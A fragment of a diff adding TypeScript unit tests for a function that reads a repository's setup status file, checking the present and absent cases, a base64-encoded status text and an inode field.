+    const dir = makeRepo("code/thing", "https://github.com/gregdetre/gjdutils.git");
+    mkdirSync(join(root, "setup"), { recursive: true });
+    const text = '{"v":1,"outcome":"success"}\n';
+    writeFileSync(p.statusPath, text);
+    const got = read({ ...p, dir, path: fakeFlock("grant") });
+    if (!got.ok) throw new Error(got.why);
+    expect(got.fields.get("status")).toBe("present");
+    const b64 = got.fields.get("text") ?? "";
+    // Not `base64 -w0`, which is GNU-only: the version of this script that
+    // lived in gjd-remote.ts used it, and would have come back empty here.
+    expect(decodeBoxField(b64, "the status").ok && decodeBoxField(b64, "the status")).toEqual({ ok: true, text });
+    expect(got.fields.get("inode")).toMatch(/^[0-9]+$/);
+  });
+
+  it("says absent, and no inode, for a repo nothing has set up in a directory that is not a checkout", () => {
+    const p = paths();
+    mkdirSync(p.dir, { recursive: true });
+    const got = read({ ...p, path: fakeFlock("grant") });
+    if (!got.ok) throw new Error(got.why);
+    expect(got.fields.get("status")).toBe("absent");
+    expect(got.fields.get("text")).toBe("-");
+    expect(got.fields.get("inode")).toBe("-");
   });
 });
 
